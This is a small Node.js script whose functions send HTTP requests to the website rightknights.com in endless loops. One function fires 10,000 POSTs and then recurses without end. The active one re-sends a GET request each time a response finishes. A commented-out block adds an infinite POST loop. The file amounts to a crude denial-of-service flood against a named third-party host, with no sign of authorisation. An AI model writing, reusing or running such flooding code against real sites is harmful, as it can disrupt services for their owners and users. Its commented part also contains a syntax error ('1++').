var unirest = require('unirest');
 var http = require('http');
var countnum=0;

attackTesting1();



function attackTesting() {

    for (var i = 0; i < 10000; i++) {
        unirest.post('http://rightknights.com/').headers({
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        }).send({
            "parameter": 23,
            "foo": "bar"
        }).end(function(response) {
            console.log(i);
        });
    }

    attackTesting();
}



function attackTesting1 (){
   

    //The url we want is: 'www.random.org/integers/?num=1&min=1&max=10&col=1&base=10&format=plain&rnd=new'
    var options = {
        host: 'rightknights.com'
    };

    callback = function(response) {
        var str = '';

        //another chunk of data has been recieved, so append it to `str`
        response.on('data', function(chunk) {
            str += chunk;
        });

        //the whole response has been recieved, so we just print it out here
        response.on('end', function() {
            console.log('request:'+countnum);
            countnum++;
            attackTesting1();
        });
    }

    http.request(options, callback).end();

}






























/*


unirest.post('http://rightknights.com/').headers({'Accept': 'application/json', 'Content-Type': 'application/json'}).send({ "parameter": 23, "foo": "bar" }).end(function (response) {
  //console.log(response.body);
});






for(var i=0;i<100;1++){
  
}


var flag=true;

do{

  var unirest2 = require('unirest');
 unirest2.post('http://rightknights.com/').headers({'Accept': 'application/json', 'Content-Type': 'application/json'}).send({ "parameter": 23, "foo": "bar" }).end(function (response) {
  console.log('Att');
});

}while (flag);

*/